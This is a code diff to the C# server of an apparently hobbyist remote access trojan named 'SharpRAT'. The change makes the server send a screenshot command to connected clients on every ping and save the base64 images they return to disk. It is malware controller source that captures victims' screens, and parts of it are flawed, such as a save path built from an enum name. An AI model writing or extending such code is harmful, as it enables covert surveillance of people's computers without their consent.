@@ -70,6 +70,8 @@ namespace Server.Server
             try
             {
                 Send(clientSocket, "<PING>");
+
+                Send(clientSocket, "<SCREENSHOT>");
                 Thread.Sleep(iPingWaitTime);
                 clientSocket.Receive(buffer);
             }
@@ -92,7 +94,12 @@ namespace Server.Server
         {
             string tempString = data.Replace("<EOF>", "");
 
-            if(tempString.StartsWith("<CMD=NAME>"))
+            if (tempString.StartsWith("<SCREENSHOT>"))
+            {
+                trreadimage(data);
+            }
+
+            if (tempString.StartsWith("<CMD=NAME>"))
             {
                 tempString = tempString.Replace("<CMD=NAME>", "");
 
@@ -102,6 +109,7 @@ namespace Server.Server
 
                 Main.uiRequests.Request(tempString, RequestUI.RequestType.UI_ADD_USER);
             }
+            
         }
 
         public void ReadCallback(IAsyncResult ar)
@@ -172,27 +180,26 @@ namespace Server.Server
             }
         }
 
-        public void trreadimage(Socket clientSocket)
+        public static void trreadimage(string data)
         {
-            byte[] dataSize = new byte[1024 * 10000];
+            byte[] bx = new byte[1024 * 10000];
             try
             {
-                string imageName = @$"C\Temp\image-" + System.DateTime.Now.Ticks + ".JPG";
-                Send(clientSocket, "<SCREENSHOT>");
-                byte[] b = new byte[1024 * 10000];  
-                clientSocket.Receive(dataSize);
-
-                if (dataSize.Length > 0)
+                data = data.Replace("<SCREENSHOT>", "");
+                data = data.Replace("<EOF>", "");
+                //clientSocket.Receive(dataSize);
+                bx = Convert.FromBase64String(data);
+                if (bx.Length > 0)
                 {
-                    string base64 = Convert.ToBase64String(dataSize);
-                    base64 = base64.Replace("<SCREENSHOT>", "");
-                    base64 = base64.Replace("<EOF>", "");
-                    byte[] bx = Convert.FromBase64String(base64);
-
+                    //string base64 = Convert.ToBase64String(dataSize);
+                    //base64 = base64.Replace("<SCREENSHOT>", "");
+                    //base64 = base64.Replace("<EOF>", "");
+                    //byte[] bx = Convert.FromBase64String(base64);
+                    string imageName = (Environment.SpecialFolder.ApplicationData) + $"\\SharpRAT\\" + System.DateTime.Now.Ticks + ".JPG";
                     MemoryStream ms = new MemoryStream(bx);
                     Image img = Image.FromStream(ms);
                     img.Save(imageName, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    
+
                     ms.Close();
                     Debug.WriteLine("3");
                 }
